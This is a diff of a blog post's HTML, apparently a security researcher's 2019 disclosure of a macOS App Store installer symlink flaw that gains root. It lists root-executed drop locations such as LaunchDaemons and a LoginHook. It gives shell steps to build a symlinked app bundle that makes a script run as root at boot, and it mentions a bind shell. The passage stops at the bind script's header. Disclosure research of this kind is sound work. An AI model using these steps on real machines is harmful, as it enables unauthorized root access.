@@ -525,54 +525,48 @@ Developers should build-in some verification of Apple IDs. I’m not sure that i
 <p>This year (2019) I’ve been talking to a few people about this, and it hit me, that I didn’t do any further checks if symlinks are completely broken (during the installation) or not. It turned out that they are still a thing.</p>
 
 <p>The way the fix is working is that <code>installd</code> has no longer access to the crontab folder (<code>/usr/lib/cron/tabs</code>) even running as root, so it won’t be able to create files there. I’m not even sure that this is a direct fix for my POC or some other coincidence. We can find the related error message in <code>/var/log/install.log</code> (you can use the Console app for viewing logs):</p>
-
-<p>```</p></li>
+<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f60">2019</span>-01-31 <span style="color:#f60">20</span>:44:49+01 csabymac shove<span style="color:#555">[</span><span style="color:#f60">1057</span><span style="color:#555">]</span>: <span style="color:#555">[</span><span style="color:#033">source</span><span style="color:#555">=</span>file<span style="color:#555">]</span> failed _RelinkFile<span style="color:#555">(</span>/var/folders/zz/zyxvpxvq6csfxvn_n0000000000000/C/PKInstallSandboxManager/401FEDFC-1D7B-4E47-A6E9-E26B83F8988F.activeSandbox/Root/Applications/Crontab Creator.app/Contents/Resources/peter, /private/var/at/tabs/peter<span style="color:#555">)</span>: Operation not permitted</code></pre></div></li>
 </ol>
 
-<p>2019-01-31 20:44:49+01 csabymac shove[1057]: [source=file] failed _RelinkFile(/var/folders/zz/zyxvpxvq6csfxvn_n0000000000000/C/PKInstallSandboxManager/401FEDFC-1D7B-4E47-A6E9-E26B83F8988F.activeSandbox/Root/Applications/Crontab Creator.app/Contents/Resources/peter, /private/var/at/tabs/peter): Operation not permitted</p>
+<h3 id="the-problem">The problem</h3>
 
-<pre><code>
-### The problem
-The `installd` process had still access to other folders, and can drop files there during the redirection, and those could be abused as well. I tested and you could redirect file writes to the following potentially dangerous folders:
+<p>The <code>installd</code> process had still access to other folders, and can drop files there during the redirection, and those could be abused as well. I tested and you could redirect file writes to the following potentially dangerous folders:</p>
 
-`/var/root/Library/Preferences/`
+<p><code>/var/root/Library/Preferences/</code></p>
 
-Someone could drop a file called `com.apple.loginwindow.plist`, which can contain a LoginHook, which will run as root.
+<p>Someone could drop a file called <code>com.apple.loginwindow.plist</code>, which can contain a LoginHook, which will run as root.</p>
 
-`/Library/LaunchDaemons/`
+<p><code>/Library/LaunchDaemons/</code></p>
 
-Dropping a plist file here will execute as root
+<p>Dropping a plist file here will execute as root</p>
 
-`/Library/StartupItems/`
+<p><code>/Library/StartupItems/</code></p>
 
-Dropping a file here will also execute as root.
+<p>Dropping a file here will also execute as root.</p>
 
-You can also write to `/etc`.
+<p>You can also write to <code>/etc</code>.</p>
 
-Dropping files into these locations are essentially the same idea as dropping a file to the crontab folder. Potentially many other folders are also affected, so you can craft malicious dylib files, etc… but I didn’t explore other options.
+<p>Dropping files into these locations are essentially the same idea as dropping a file to the crontab folder. Potentially many other folders are also affected, so you can craft malicious dylib files, etc… but I didn’t explore other options.</p>
 
-### The 2nd POC
+<h3 id="the-2nd-poc">The 2nd POC</h3>
 
-With that, and now being an ‘experienced’ :D macOS developer, I made a new POC, called StartUp. It’s this:
-[‎StartUp on the Mac App Store](https://itunes.apple.com/us/app/startup/id1452212620)
+<p>With that, and now being an ‘experienced’ :D macOS developer, I made a new POC, called StartUp. It’s this:
+<a href="https://itunes.apple.com/us/app/startup/id1452212620">‎StartUp on the Mac App Store</a></p>
 
-![image6](/images/Getting_root_with_benign_AppStore_apps/Screenshot%202019-02-12%20at%2010.39.44.png)
+<p><img src="/images/Getting_root_with_benign_AppStore_apps/Screenshot%202019-02-12%20at%2010.39.44.png" alt="image6" /></p>
 
-It is really built along the same line as the previous one, but in this case for LaunchDaemons.
+<p>It is really built along the same line as the previous one, but in this case for LaunchDaemons.</p>
 
-The way to utilize it is:
-```bash
-cd /Applications/
+<p>The way to utilize it is:</p>
+<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#366">cd</span> /Applications/
 mkdir “StartUp.app”
-cd StartUp.app/
+<span style="color:#366">cd</span> StartUp.app/
 mkdir Contents
-cd Contents/
+<span style="color:#366">cd</span> Contents/
 ln -s /Library/LaunchDaemons/ Resources
-cd /Applications/
+<span style="color:#366">cd</span> /Applications/
 mkdir Scripts
-cd Scripts/
-</code></pre>
-
+<span style="color:#366">cd</span> Scripts/</code></pre></div>
 <p>Here you can create a sample.sh script that will run as root after booting up. For myself I put a bind shell into that script, and after login, connecting to it I got a root shell, but it’s up to you what you put there.</p>
 <div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#09f;font-style:italic">#sample.sh</span>
 python /Applications/Scripts/bind.py</code></pre></div><div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#09f;font-style:italic">#bind.py</span>
